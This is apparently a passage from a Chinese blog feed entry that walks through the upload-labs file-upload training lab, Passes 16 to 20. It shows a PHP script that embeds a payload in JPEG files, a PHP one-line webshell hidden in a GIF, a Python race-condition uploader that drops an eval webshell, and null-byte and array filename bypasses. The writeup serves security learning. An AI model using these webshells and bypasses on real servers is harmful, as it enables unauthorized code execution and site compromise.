TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&apos;Incorrect SOI marker&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&apos;Success!&apos;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&apos;payload_&apos;.$argv[1]);</span><br><span class="line">    die(&apos;Something\&apos;s wrong&apos;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &apos;&apos;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&apos;File not exists [&apos;.$filename.&apos;]&apos;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&apos;End Of File&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&apos;End Of File&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>随便找张jpg的图片然后 命名为1.jpg<br><img src="https://i.imgur.com/FwTikCN.png" alt=""></p><p>然后使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg然而貌似不可以最后会出现错误 原因未知<br>展示下其他方法<br>改gif的简单 上传一个gif图片<br>用winhex对比 视图 同步比较<br>在没有变化的地方添加 一句话木马<br>上传即成功<br><img src="https://i.imgur.com/M4zrgbG.png" alt=""><br><img src="https://i.imgur.com/ADmnOJV.png" alt=""><br>嗯，小别致可真东西</p><h3 id="Pass-017-条件竞争"><a href="#Pass-017-条件竞争" class="headerlink" title="Pass-017  条件竞争"></a>Pass-017  条件竞争</h3><p>看下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &apos;上传出错！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看了这个源码，我一度怀疑这个题目是不是出错了？这个不是只是一个白名单吗？直接上传一个jpg/png/gif的马不就好了吗？<br>尝试下，直接上传成功<br><img src="https://i.imgur.com/991HKr1.png" alt=""><br>然而这个题目本意并非如此，因为上传的图片会被改名<br>我们如何上传一个不会改名的图片呢？<br>这里可以使用竞争上传的方式去突破，同时使用多个进程去上传php文件，php文件的内容是向服务器目录下写一个webshell，之后不断去去访问上传的php文件，如果在删除该php文件之前访问到了该php文件，就会向服务器目录写一个webshell，用python去实现多进程上传<br>详细来自<a href="http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3" target="_blank" rel="noopener">这里</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">from multiprocessing import Pool</span><br><span class="line">def CompeteUpload(list):</span><br><span class="line">    url=&quot;http://192.168.242.128/upload-labs/Pass-17/index.php&quot;</span><br><span class="line">    geturl=&quot;http://192.168.242.128/upload-labs/upload/info.php&quot;</span><br><span class="line">    file=&#123;&apos;upload_file&apos;:(&apos;info.php&apos;,&quot;&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[ironman]);?&gt;&apos;);?&gt;&quot;,&apos;image/jpeg&apos;)&#125;</span><br><span class="line">    data=&#123;&apos;submit&apos;:&apos;上传&apos;&#125;</span><br><span class="line">    r=requests.post(url=url,data=data,files=file)</span><br><span class="line">    #print &quot;test upload....&quot;</span><br><span class="line">    r1=requests.get(url=geturl)</span><br><span class="line">    if r1.status_code==200:</span><br><span class="line">        print &quot;upload success!&quot;</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    pool = Pool(10)</span><br><span class="line">    pool.map(CompeteUpload, range(10000))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/TY1fzHj.png" alt=""><br>上传成功，<br>当然我们也可以通过Burpsuit进行暴力上传这里就不演示了</p><h3 id="Pass-018-条件竞争"><a href="#Pass-018-条件竞争" class="headerlink" title="Pass-018  条件竞争"></a>Pass-018  条件竞争</h3><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;./myupload.php&quot;);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = new MyUpload($_FILES[&apos;upload_file&apos;][&apos;name&apos;], $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $_FILES[&apos;upload_file&apos;][&apos;size&apos;],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload = true;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg = &apos;文件已经被上传，但没有重命名。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg = &apos;这个文件不能上传到服务器的临时文件存储目录。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg = &apos;上传失败，上传目录不可写。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg = &apos;上传失败，无法上传该类型文件。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg = &apos;上传失败，上传的文件过大。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg = &apos;上传失败，服务器已经存在相同名称文件。&apos;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg = &apos;文件无法上传，文件不能复制到目标目录。&apos;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg = &apos;未知错误！&apos;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//myupload.php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  /** upload()</span><br><span class="line">   **</span><br><span class="line">   ** Method to upload the file.</span><br><span class="line">   ** This is the only method to call outside the class.</span><br><span class="line">   ** @para String name of directory we upload to</span><br><span class="line">   ** @returns void</span><br><span class="line">  **/</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkExtension();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkSize();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists == 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;move();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file == 1 )&#123;</span><br><span class="line">      $ret = $this-&gt;renameFile();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>嗯图片马再次上传成功<br>这里大概是采取白名单的形式<br><img src="https://i.imgur.com/KOJ9FHE.png" alt=""><br>我们可以看到move在rename的前面<br>所以我们可以采取竞争的形式上传shell<br>具体不演示了</p><h3 id="Pass-019-00截断-过滤"><a href="#Pass-019-00截断-过滤" class="headerlink" title="Pass-019  00截断/./过滤"></a>Pass-019  00截断/./过滤</h3><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&apos;save_name&apos;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &apos;上传出错！&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &apos;禁止保存为该类型文件！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以一种黑名单的形式进行限制，我们可以采取apache解析漏洞，话说apache解析漏洞在2.4以上版本好像就不怎么好用了，<br>当然也可以用move_uploaded_file函数的00截断漏洞绕过。<br>具体如下CVE-2015-2348<br>当然还有一种方法就是文件名后缀加./ move_uploaded_file这个函数遇到./就会忽略<br><img src="https://i.imgur.com/rq59afC.png" alt=""><br>上传成功</p><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a><br>漏洞绕过<br>不过这个条件貌似有点苛刻，反正我本地的环境是上传不了的</p><h3 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20-数组+/.绕过"></a>Pass-20-数组+/.绕过</h3><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(!empty($_FILES[&apos;upload_file&apos;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&apos;image/jpeg&apos;,&apos;image/png&apos;,&apos;image/gif&apos;);</span><br><span class="line">    if(!in_array($_FILES[&apos;upload_file&apos;][&apos;type&apos;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&apos;save_name&apos;]) ? $_FILES[&apos;upload_file&apos;][&apos;name&apos;] : $_POST[&apos;save_name&apos;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&apos;.&apos;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &apos;.&apos; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;文件上传失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;请选择要上传的文件！&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很明显这是采取白名单的形式进行过滤<br>首先先判断文件的类型<br>通过<br><img src="https://i.imgur.com/x3CisCu.png" alt=""><br>进行获取文件的文件名<br>这里是判断文件是否为数组<br>我们可以使文件名为数组进行绕过</p><blockquote><p>end - 将数组的内部指针设置为其最后一个元素</p></blockquote><p>例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$fruits = array(&apos;apple&apos;, &apos;banana&apos;, &apos;cranberry&apos;);</span><br><span class="line">echo end($fruits); // cranberry</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>所以我们可以令数组的最后一个元素为jpg等进行绕过<br>这里会将文件进行重命名<br><img src="https://i.imgur.com/r7yMqiE.png" alt=""></p><blockquote><p>reset - 将数组的内部指针设置为其第一个元素</p></blockquote><p>我们可以将第一个数组file[0]为shell.php/ file[1]为空,file[2]为jpg<br><img src="https://i.imgur.com/gfjvuJV.png" alt=""></p><p>上传成功</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>完结撒花o(<em>￣▽￣</em>)ブ</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/4029#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-16</a><br><a href="https://xz.aliyun.com/t/2657#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-8</a><br><a href="http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3" target="_blank" rel="noopener">http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3</a><br><a href="https://zhuanlan.zhihu.com/p/52099683" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/52099683</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      关于upload-labs Pass 16 ~ 20的writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="文件上传" scheme="https://museljh.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>通过hackme中xss题目理解XSS所包含的巨大威力</title>
    <link href="https://museljh.github.io/2019/02/15/%E9%80%9A%E8%BF%87hackme%E4%B8%ADxss%E9%A2%98%E7%9B%AE%E7%90%86%E8%A7%A3XSS%E6%89%80%E5%8C%85%E5%90%AB%E7%9A%84%E5%B7%A8%E5%A4%A7%E5%A8%81%E5%8A%9B/"/>
    <id>https://museljh.github.io/2019/02/15/通过hackme中xss题目理解XSS所包含的巨大威力/</id>
    <published>2019-02-15T07:44:09.000Z</published>
    <updated>2019-02-15T07:58:05.148Z</updated>
    
